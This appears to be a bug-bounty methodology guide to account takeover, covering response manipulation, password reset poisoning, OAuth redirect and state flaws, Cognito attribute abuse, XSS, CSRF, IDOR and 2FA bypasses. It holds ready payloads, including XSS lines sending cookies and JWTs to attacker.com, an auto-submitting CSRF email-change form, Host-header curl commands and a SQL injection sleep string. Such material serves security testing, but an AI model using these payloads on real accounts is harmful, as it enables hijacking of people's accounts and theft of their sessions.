Account Takeover is a form of identity theft where an attacker gains unauthorized access to a user's account. This guide consolidates various methods and techniques to identify and exploit vulnerabilities leading to ATO.

---

## Exploitation Methods

### 1. Authentication & Session Flaws

#### Response Manipulation
Bypass authentication checks by manipulating server responses. This is common with OTP/2FA and password validation endpoints that use JSON.

1.  Enter an incorrect OTP, password, or auth code.
2.  Capture the request in a proxy like Burp Suite.
3.  Enable "Intercept Response to this Request".
4.  Forward the request and intercept the server's response.
5.  Modify the response body from a failure to a success message and observe the result.

**Example Payloads:**
*   `{"code":"invalid_credentials"}` -> `{"code":"valid_credentials"}`
*   `{"verify":"false"}` -> `{"verify":"true"}`
*   `{"success":false}` -> `{"success":true}`
*   Modify a status code from `401 Unauthorized` to `200 OK`.

#### Reusing Old Cookies
Some applications fail to invalidate session cookies upon logout or new login, allowing old cookies to be reused for access.

1.  Log in to an account and save the session cookies.
2.  Log out and then log back in. The application may generate new cookies.
3.  Attempt to use the old, saved cookies to access the account. If successful, the session management is flawed.

#### Token Leaks in Response
Sensitive tokens, links, or OTPs may be leaked directly in the HTTP response body during registration or password reset flows.

1.  Intercept the request for signup or password reset.
2.  In Burp Suite, use Action -> "Do Intercept" -> "Response to this request".
3.  Forward the request and inspect the response body for any sensitive data like a reset token, full reset link, or OTP.

### 2. Registration & Signup Flaws

#### Pre-Account Takeover
This occurs when an attacker can register an account with a victim's email address before the victim does, later gaining access when the victim links a third-party account (like OAuth).

1.  Register an account on the target platform using the victim's email address. Do not verify the email if possible.
2.  Wait for the victim to sign up for the same service using an OAuth provider (e.g., "Sign in with Google").
3.  If the application links the OAuth identity to the pre-existing, unverified account based on the email address, the attacker's password will now grant access to the victim's account.

#### Duplicate Email Registration
Attempt to create a new account with an email address that is already registered. Some systems handle this poorly and may overwrite the original account's password or link a new identity to it.

```bash
# First, sign up with the victim's email
POST /newaccount HTTP/1.1
...
email=victim@mail.com&password=somepassword

# Later, attempt to sign up again with a new password
POST /newaccount HTTP/1.1
...
email=victim@mail.com&password=hackedpassword
```

#### Unicode Normalization Issue
Abuse Unicode normalization to create an account visually similar to the victim's, which the backend may normalize to the same ASCII representation.

1.  Identify the victim's email, e.g., `victim@gmail.com`.
2.  Create a new account using a visually similar Unicode character, e.g., `vićtim@gmail.com`.
3.  If the application normalizes `vićtim` to `victim` *after* the initial uniqueness check but *before* authentication, you may be able to log in to the original victim's account.
4.  This can also be chained with third-party identity providers that do not verify emails.

### 3. Password Reset Poisoning

The goal is to manipulate the password reset link sent to the victim so that it points to an attacker-controlled server, leaking the reset token.

1.  Go to the password reset page and enter the victim's email.
2.  Intercept the POST request that initiates the reset.
3.  Inject or modify headers to poison the URL generation.

**Headers to Inject/Modify:**
*   **Host Header:** Change the `Host` header to your domain.
    `Host: attacker.com`
*   **Proxy Headers:** Add headers that applications behind a reverse proxy might trust.
    `X-Forwarded-Host: attacker.com`
    `X-Forwarded-For: attacker.com`
*   **Other Headers:**
    `Referer: https://attacker.com`
    `Origin: https://attacker.com`

If successful, the password reset link sent to the victim will contain `attacker.com` instead of the legitimate domain, and their token will be sent to your server when they click it.

### 4. OAuth Misconfigurations

OAuth flaws often lead to direct account takeover by tricking the application or user into linking the victim's identity to the attacker's account.

#### Open `redirect_uri`
If the `redirect_uri` parameter is not strictly validated, an attacker can redirect the authorization code to their own server.

1.  Initiate an OAuth flow and capture the request to the authorization server.
2.  Identify the `redirect_uri` parameter.
3.  Test for common bypasses:
    *   Subdomain (`evil.example.com`)
    *   Path traversal (`https://example.com/login/..;/callback`)
    *   Weak regex (`https://example.com.attacker.com`)
    *   Parameter pollution (`&redirect_uri=attacker.com`)
    *   Open redirects on the redirect endpoint itself.

**Example Request:**
```http
GET /auth?response_type=code&client_id=CLIENT_ID&redirect_uri=https://attacker.com/callback&scope=read&state=XYZ HTTP/1.1
Host: oauth-provider.com
```

#### CSRF via Improper `state` Parameter
The `state` parameter is a CSRF token for the OAuth flow. If it's missing, static, or not validated, an attacker can hijack the flow.

1.  **Attacker:** Initiates an OAuth flow with their own account on the target service.
2.  **Attacker:** Pauses the flow right before being redirected back to the `redirect_uri`.
3.  **Attacker:** Tricks the victim (who is logged into the target service) into completing the authorization flow.
4.  **Result:** The victim's OAuth identity (e.g., their Google account) gets linked to the attacker's account on the target service. The attacker can now log in using "Sign in with Google".

#### Pre-Account Takeover via OAuth
Similar to the standard pre-takeover, but exploits OAuth services that don't verify emails.

1.  Attacker registers on an OAuth provider (e.g., a custom provider) with their own email.
2.  Attacker changes their email address on the OAuth provider to the victim's email. The provider does not require re-verification.
3.  Attacker uses this OAuth account to sign into the target application.
4.  The application trusts the unverified email from the OAuth provider and grants access, potentially taking over an existing account.

#### Leaked `client_secret`
If the `client_secret` is leaked (e.g., in mobile app code, client-side JS), an attacker can generate access tokens on behalf of the application, impersonating it to steal user data.

#### Abusing AWS Cognito Tokens
Tokens issued by AWS Cognito might have excessive permissions, allowing user attribute modification.

1.  Obtain a Cognito access token for your own account.
2.  Use the AWS CLI to inspect your user data with the token.
	```bash
    aws cognito-idp get-user --region us-east-1 --access-token <YOUR_TOKEN>
    ```
3.  Attempt to update your user attributes, changing your email to the victim's email.
    ```bash
    aws cognito-idp update-user-attributes --region us-east-1 --access-token <YOUR_TOKEN> --user-attributes Name=email,Value=victim@example.com
    ```
    If this succeeds, you may be able to trigger a password reset for the victim's email, which is now tied to your Cognito identity.

### 5. Classic Web Vulnerabilities Leading to ATO

#### Cross-Site Scripting (XSS)
An XSS vulnerability can be used to steal session cookies, JWTs from local storage, or perform actions on behalf of the logged-in user.

1.  Find a stored or reflected XSS vulnerability.
2.  Craft a payload to exfiltrate session data.
    ```javascript
    // Steal cookies
    new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie;

    // Steal from localStorage
    new Image().src = 'https://attacker.com/steal?token=' + localStorage.getItem('jwt_token');
    ```
3.  Use the stolen session token to hijack the victim's account.

#### Cross-Site Request Forgery (CSRF)
If critical functions like changing the email, password, or security questions are not protected by anti-CSRF tokens, an attacker can force a victim to perform these actions unknowingly.

1.  Log into your account and perform the action you want to forge (e.g., change email).
2.  Capture the request in Burp Suite.
3.  Generate a CSRF PoC (Action -> Engagement tools -> Generate CSRF PoC).
4.  Modify the PoC to change the victim's details to values you control.
5.  Host the PoC on a webpage and trick the victim into visiting it while logged in.

**Example CSRF PoC for Email Change:**
```html
<html>
  <body>
    <form action="https://target.com/user/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@email.com" />
      <input type="submit" value="Click for a surprise!" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

#### Insecure Direct Object References (IDOR)
If endpoints use predictable, user-controllable identifiers (like `user_id=123`) without proper authorization checks, you can perform actions on other users' accounts.

1.  Create two accounts: one attacker, one victim.
2.  Perform a sensitive action as the attacker (e.g., change password) and intercept the request.
3.  Identify your user ID in the request parameters, body, or URL.
4.  Replace your ID with the victim's ID and resend the request.

**Example IDOR in Password Change:**
```http
POST /api/changepassword HTTP/1.1
Host: target.com
...

userid=500&new_password=hacked123
```
Change `userid=500` (attacker) to `userid=501` (victim).

#### CORS Misconfiguration
A permissive CORS policy can allow a malicious site to make authenticated requests to the target domain and read the responses, potentially exfiltrating sensitive data like API keys or PII that can be used for takeover.

---

## Bypasses

#### Email Verification Bypass
If an application allows an email address change without sending a verification link to the *new* email address, this can be abused.

1.  Attacker signs up with `attacker@email.com` and verifies it.
2.  Attacker navigates to account settings and changes their email to `victim@email.com`.
3.  The application updates the email without verification.
4.  The attacker can now initiate a password reset for `victim@email.com`, receiving the link themselves (if the system sends it to the session, not the email on file) or having changed the primary identifier for the account.

#### 2FA/OTP Bypass
*   **No Rate Limiting:** Brute-force the 4-6 digit code if there's no lockout mechanism.
*   **Response Manipulation:** As detailed above, change `{"success":false}` to `{"success":true}`.
*   **Leaked in Response:** The OTP code might be leaked in the response to the request that triggers the SMS/email.
*   **OAuth ROPC Flow:** The "Resource Owner Password Credentials" grant type in OAuth allows login with just a username and password. If this flow returns a fully-scoped access token, it may bypass a 2FA check that exists on the standard web login form.

---

## Payloads & One-Liners

*   **SQL Injection Sleep Payload (Username/Email):** Test for time-based SQLi on login or signup forms.
```sql
    ' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
```

*   **Host Header Injection Variations:**
    ```bash
    # Basic
    curl -X POST https://target.com/reset -H "Host: attacker.com" ...

    # With X-Forwarded-Host
    curl -X POST https://target.com/reset -H "X-Forwarded-Host: attacker.com" ...
    ```

*   **Open Redirect Payloads for `redirect_uri`:**
    ```
    # Path based
    https://target.com/oauth/redirect?redirect_uri=https://target.com.attacker.com
    https://target.com/oauth/redirect?redirect_uri=https://attacker.com
    https://target.com/oauth/redirect?redirect_uri=//attacker.com
    ```

---

## Chaining & Higher Impact

*   **XSS + Session Hijacking:** Use an XSS payload to steal the session cookie and use it to take over the account.
*   **IDOR + CSRF:** If an IDOR is found but requires the victim's cookie, chain it with CSRF to force the victim's browser to execute the IDOR-vulnerable request.
*   **Open Redirect + OAuth Token Theft:** An open redirect on the final step of an OAuth flow can leak the `code` and `state` to an attacker's server, especially if they are passed in the URL fragment (`#`).

---

## References

*   [Pre-Account Takeover using OAuth Misconfiguration](https://vijetareigns.medium.com/pre-account-takeover-using-oauth-misconfiguration-ebd32b80f3d3)
*   [Account Takeover via CSRF](https://medium.com/bugbountywriteup/account-takeover-via-csrf-78add8c99526)
*   [How re-signing up for an account lead to account takeover](https://zseano.medium.com/how-re-signing-up-for-an-account-lead-to-account-takeover-3a63a628fd9f)
*   [One Click Account Takeover](https://dynnyd20.medium.com/one-click-account-take-over-e500929656ea)
*   [Hidden OAuth Attack Vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)
*   [The wonderful world of OAuth - Bug Bounty Edition](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)